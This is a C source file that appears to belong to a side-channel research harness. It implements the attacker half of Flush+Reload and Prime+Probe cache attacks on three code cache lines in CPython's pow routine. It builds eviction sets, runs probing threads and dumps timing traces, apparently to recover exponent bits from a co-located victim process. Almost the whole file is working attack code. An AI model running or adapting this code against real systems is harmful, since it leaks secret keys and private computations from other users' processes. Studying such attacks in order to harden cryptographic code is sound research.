#include "cpython_pow.h"

#include "cache/evset.h"
#include "prime_probe.h"
#include <errno.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "flush_reload.h"
#include "fs.h"
#include "log.h"
#include "shared_memory.h"

#define CACHE_LINE_COUNT (3)
#define PROFILE_ITERATIONS (1 << 15)

CPYTHON_TARGET_CACHELINE(DECLARE_CACHE_LINE);
sync_ctx_t sync_ctx;
uint64_t victim_runs = 1;

static uint64_t tsc_buffer[CACHE_LINE_COUNT * PROFILE_ITERATIONS];
static uint64_t lat_buffer[CACHE_LINE_COUNT * PROFILE_ITERATIONS];

static double cz_freq = 18.46, aw_freq = 18.18, at_freq = 18.18,
              at_side_freq = 21.33;

/* PS-mode pointer arrays, assigned at the start of PS_profile_pow(). */
static uint64_t *sample_tsc[CACHE_LINE_COUNT];
static uint64_t *probe_time[CACHE_LINE_COUNT];
static uint64_t *reload_time[CACHE_LINE_COUNT];

enum {
	cache_line_count = CACHE_LINE_COUNT,
	profile_iterations = PROFILE_ITERATIONS
};
static const uint64_t max_exec_cycles = (uint64_t)3e9;
static const char *test_name = "cpython_pow";
static pthread_barrier_t attacker_threads_barrier;

void FF_profile_pow() {
	static const uint64_t waiting_time = 80000;

	for (int i = 0; i < CACHE_LINE_COUNT; ++i) {
		sample_tsc[i] = tsc_buffer + i * PROFILE_ITERATIONS;
		reload_time[i] = lat_buffer + i * PROFILE_ITERATIONS;
	}

	init_sync_ctx(CPYTHON_PROJ_ID);

	log_info("Wait for victim initialization");

	pthread_barrier_wait(sync_ctx.barrier);

	CPYTHON_TARGET_CACHELINE(TARGET_ADDRESS_OFFSET)

	for (int i = 0; i < (int)victim_runs; ++i) {
		log_info("Attacker Iteration %d", i);

		int index = 0;
		sync_ctx_set_action(SYNC_CTX_START);
		pthread_barrier_wait(sync_ctx.barrier);

		while (index < PROFILE_ITERATIONS) {
			FLUSH_CACHE_LINE(consume_zero, 2);
			FLUSH_CACHE_LINE(absorb_window, 2);
			FLUSH_CACHE_LINE(absorb_trailing, 2);

			FR_wait(waiting_time);

			RELOAD_CACHE_LINE(consume_zero, 2, 0);
			RELOAD_CACHE_LINE(absorb_window, 2, 1);
			RELOAD_CACHE_LINE(absorb_trailing, 2, 2);

			++index;
		}

		if (sync_ctx_get_action() == SYNC_CTX_START) {
			log_warn("Insufficient profiler iterations");
		}

		pthread_barrier_wait(sync_ctx.barrier);

		dump_profiling_traces(test_name,
		                      victim_runs,
		                      sample_tsc,
		                      reload_time,
		                      CACHE_LINE_COUNT,
		                      index,
		                      index == 0);

		memset(tsc_buffer, 0, sizeof(tsc_buffer));
		memset(lat_buffer, 0, sizeof(lat_buffer));
	}

	sync_ctx_set_action(SYNC_CTX_EXIT);
	pthread_barrier_wait(sync_ctx.barrier);
}

void PS_profile_pow() {
	PS_attacker_thread_config_t pt_consume_zero, pt_absorb_window,
	    pt_absorb_trailing;
	helper_thread_ctrl hctrl;

	init_sync_ctx(CPYTHON_PROJ_ID);
	CPYTHON_TARGET_CACHELINE(TARGET_ADDRESS_OFFSET);

	if (cache_env_init(1)) {
		log_error("Failed to initialize cache env!\n");
		return;
	}

	if (start_helper_thread(&hctrl)) {
		log_error("Failed to start helper!\n");
		return;
	}

	for (int i = 0; i < CACHE_LINE_COUNT; ++i) {
		sample_tsc[i] = tsc_buffer + i * PROFILE_ITERATIONS;
		probe_time[i] = lat_buffer + i * PROFILE_ITERATIONS;
	}

	PS_thread_config_init(pt_consume_zero);
	pt_consume_zero.label = "consume_zero";
	pt_consume_zero.slot = 0;
	pt_consume_zero.pin_cpu = -1;
	pt_consume_zero.target =
	    (uint8_t *)((uintptr_t)target_consume_zero + 2 * CACHE_LINE_SIZE);
	pt_consume_zero.evset = prepare_evset(pt_consume_zero.target, &hctrl);

	PS_thread_config_init(pt_absorb_window);
	pt_absorb_window.label = "absorb_window";
	pt_absorb_window.slot = 1;
	pt_absorb_window.pin_cpu = -1;
	pt_absorb_window.target =
	    (uint8_t *)((uintptr_t)target_absorb_window + 2 * CACHE_LINE_SIZE);
	pt_absorb_window.evset = prepare_evset(pt_absorb_window.target, &hctrl);

	PS_thread_config_init(pt_absorb_trailing);
	pt_absorb_trailing.label = "absorb_trailing";
	pt_absorb_trailing.slot = 2;
	pt_absorb_trailing.pin_cpu = -1;
	pt_absorb_trailing.target =
	    (uint8_t *)((uintptr_t)target_absorb_trailing + 2 * CACHE_LINE_SIZE);
	pt_absorb_trailing.evset = prepare_evset(pt_absorb_trailing.target, &hctrl);

	stop_helper_thread(&hctrl);

	if (pthread_barrier_init(
	        &attacker_threads_barrier, NULL, CACHE_LINE_COUNT) != 0) {
		log_error("Error initializing barrier\n");
		return;
	}

	pthread_barrier_wait(sync_ctx.barrier);

	pthread_t thread0 = 0, thread1 = 0, thread2 = 0;
	pthread_create(&thread0, NULL, PS_attacker_thread, &pt_consume_zero);
	pthread_create(&thread1, NULL, PS_attacker_thread, &pt_absorb_window);
	pthread_create(&thread2, NULL, PS_attacker_thread, &pt_absorb_trailing);

	pthread_join(thread0, NULL);
	pthread_join(thread1, NULL);
	pthread_join(thread2, NULL);

	sync_ctx_set_action(SYNC_CTX_EXIT);
	pthread_barrier_wait(sync_ctx.barrier);
}

int main(int argc, char **argv) {
	int use_ff = 0, use_ps = 0;

	for (int i = 1; i < argc; ++i) {
		if (strcmp(argv[i], "-FR") == 0) {
			use_ff = 1;
		} else if (strcmp(argv[i], "-PS") == 0) {
			use_ps = 1;
		} else {
			char *endptr = NULL;
			errno = 0;
			const uint64_t value = strtoull(argv[i], &endptr, 10);
			if (errno == 0 && endptr != argv[i] && *endptr == '\0') {
				victim_runs = value;
			}
		}
	}

	if (!use_ff && !use_ps) {
		log_error("Usage: %s [-FR | -PS] [iterations]", argv[0]);
		exit(1);
	}

	if (use_ff && use_ps) {
		log_error("Cannot specify both -FR and -PS");
		exit(1);
	}

	if (victim_runs == 0) {
		log_error("python iterations has to be non-zero");
		exit(1);
	}

	if (use_ff)
		FF_profile_pow();
	else
		PS_profile_pow();

	return 0;
}
